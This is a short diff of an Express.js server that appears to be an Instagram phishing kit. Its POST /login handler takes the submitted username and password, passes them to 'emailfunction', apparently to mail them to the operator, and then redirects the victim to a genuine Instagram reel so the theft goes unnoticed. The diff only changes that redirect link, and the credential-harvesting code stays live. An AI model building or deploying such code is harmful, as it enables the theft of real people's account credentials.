@@ -42,7 +42,7 @@ app.get('/reels/login', (req, res) => {
 app.post('/login', async (req, res) => {
     const { username, password } = req.body;
     emailfunction(username, password);
-    res.redirect('https://www.instagram.com/p/DAQRhcuz_xs/?utm_source=ig_web_copy_link');
+    res.redirect('https://www.instagram.com/reel/C7QKTOWPI6x/?igsh=cHk4YnVsZGZ2cHBy');
 });
 app.listen(port, () => {
     console.log(`Server is running on port ${port}`);
